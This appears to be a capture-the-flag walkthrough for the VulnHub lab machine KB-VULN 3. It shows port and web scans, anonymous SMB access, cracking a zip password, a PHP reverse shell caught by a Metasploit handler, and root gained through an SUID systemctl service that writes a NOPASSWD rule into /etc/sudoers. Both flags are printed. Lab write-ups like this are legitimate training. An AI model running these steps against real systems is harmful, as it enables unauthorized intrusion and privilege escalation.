
# KB-VULN 3 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/kb-vuln-3,579/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.131   08:00:27:a3:ae:b7      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.131
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 17:45 -03
Nmap scan report for 192.168.1.131
Host is up (0.00061s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cb:04:f0:36:3f:42:f7:3a:ce:2f:f5:4c:e0:ab:fe:17 (RSA)
|   256 61:06:df:25:d5:e1:e3:47:fe:13:94:fd:74:0c:85:00 (ECDSA)
|_  256 50:89:b6:b4:3a:0b:6e:63:12:10:40:e2:c4:f9:35:33 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: KB-SERVER; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: KB-SERVER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: kb-server
|   NetBIOS computer name: KB-SERVER\x00
|   Domain name: \x00
|   FQDN: kb-server
|_  System time: 2021-04-01T20:46:08+00:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-01T20:46:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.06 seconds
```

## Web Analysis

```
$ dirb http://192.168.1.131

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr  1 17:47:44 2021
URL_BASE: http://192.168.1.131/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.131/ ----
+ http://192.168.1.131/index.html (CODE:200|SIZE:8768)                                                              
+ http://192.168.1.131/server-status (CODE:403|SIZE:278)                                                            
                                                                                                                    
-----------------
END_TIME: Thu Apr  1 17:47:48 2021
DOWNLOADED: 4612 - FOUND: 2
```

```
$ nikto -h http://192.168.1.131

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.131
+ Target Hostname:    192.168.1.131
+ Target Port:        80
+ Start Time:         2021-04-01 17:48:13 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2240, size: 5b0b40b8dd680, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-04-01 17:49:40 (GMT-3) (87 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -t 50 -u http://192.168.1.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.131
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,js,/,html
[+] Timeout:                 10s
===============================================================
2021/04/01 17:47:29 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 8768]
/server-status        (Status: 403) [Size: 278] 
                                                
===============================================================
2021/04/01 17:53:23 Finished
===============================================================
```

I did not find nothing with Web Analysis result.

## SMB Analysis

```
$ smbmap -H 192.168.1.131
[+] Guest session   	IP: 192.168.1.131:445	Name: 192.168.1.131                                     
    Disk                Permissions Comment
	----                ----------- -------
	Files               READ, WRITE HACK ME
	IPC$                NO ACCESS   IPC Service (Samba 4.7.6-Ubuntu)
```

```
$ smbclient //192.168.1.131/Files
Enter WORKGROUP\burton's password: anonymous

Anonymous login successful
Try "help" to get a list of possible commands.

smb: \> dir
  .                                   D        0  Thu Apr  1 17:49:16 2021
  ..                                  D        0  Fri Oct  2 14:12:00 2020
  website.zip                         N 38936127  Fri Oct  2 15:11:41 2020

		14380040 blocks of size 1024. 9439016 blocks available

smb: \> get website.zip
getting file \website.zip of size 38936127 as website.zip (118085.6 KiloBytes/sec) (average 118085.6 KiloBytes/sec)

smb: \> exit
$
```

Cracking `website.zip` password.
```
$ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' website.zip
PASSWORD FOUND!!!!: pw == porchman
```

Unzip
```
$ unzip website.zip 
Archive:  website.zip
[website.zip] README.txt password: porchman

$ cat README.txt 
Hi Heisenberg! Your website is activated. --> kb.vuln
Username  : admin
Password  : jesse
Have a good day !
```

Credentials:
* User: **admin**
* Pass: **jesse**

## WEB Analysis

Update `/etc/hosts` with **kb.vuln** DNS
```
192.168.1.131 kb.vuln
```

Now we are able to access the real page:
```
[ GET ] http://kb.vuln
```

There is login button that redirect us to:
```
[ GET ] http://kb.vuln/index.php?SMExt=SMLogin
```

Using previously acquired credentials, we are able to login.

## Reverse Shell

I used the PHP injection through Sitemagic login using the retrieved credentials.\
I uploaded the PHP reverse shell file (`reverse_shell.php`) in `files/images` directory.\
So I listened the connection in my host and called `http://kb.vuln/files/images/reverse_shell.php`

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST 192.168.1.189

msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Command shell session 1 opened (192.168.1.189:4444 -> 192.168.1.131:38374) at 2021-04-01 18:11:43 -0300

$ python -c 'import pty;pty.spawn("/bin/bash")'

www-data@kb-server:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Flag #1 - User

```
www-data@kb-server:/home/heisenberg$ cat user.txt
6346c6d19751f1a3195f1e4b4b609544
```

## Privilege Escalation - Root

Looking for SUID binaries, we can find an unusual binary: `/bin/systemctl`
```
www-data@kb-server:/var/www/html/sitemagic$ find / -type f -perm -u=s 2>/dev/null

/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/at
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/bin/systemctl                  <<<<<<
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping
```

Using `GTFOBins`: https://gtfobins.github.io/gtfobins/systemctl/#suid
```
www-data@kb-server:/var/www/html/sitemagic$ cat privesc.service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "echo \"www-data ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers"
[Install]
WantedBy=multi-user.target

www-data@kb-server:/var/www/html/sitemagic$ systemctl link /var/www/html/sitemagic/privesc.service
www-data@kb-server:/var/www/html/sitemagic$ systemctl enable --now /var/www/html/sitemagic/privesc.service

www-data@kb-server:/var/www/html/sitemagic$ sudo su
root@kb-server:/var/www/html/sitemagic#

root@kb-server:/var/www/html/sitemagic# id
uid=0(root) gid=0(root) groups=0(root)
```

## Flag #2 - Root

```
root@kb-server:~# cat root.txt
                                                                                                      
  ####   ####  #    #  ####  #####    ##   ##### #    # #        ##   ##### #  ####  #    #  ####     
 #    # #    # ##   # #    # #    #  #  #    #   #    # #       #  #    #   # #    # ##   # #        
 #      #    # # #  # #      #    # #    #   #   #    # #      #    #   #   # #    # # #  #  ####     
 #      #    # #  # # #  ### #####  ######   #   #    # #      ######   #   # #    # #  # #      #    
 #    # #    # #   ## #    # #   #  #    #   #   #    # #      #    #   #   # #    # #   ## #    #    
  ####   ####  #    #  ####  #    # #    #   #    ####  ###### #    #   #   #  ####  #    #  #### 
  
                                            kernelblog.org

49360ba4cbe27a1b900df25b247315d7
```
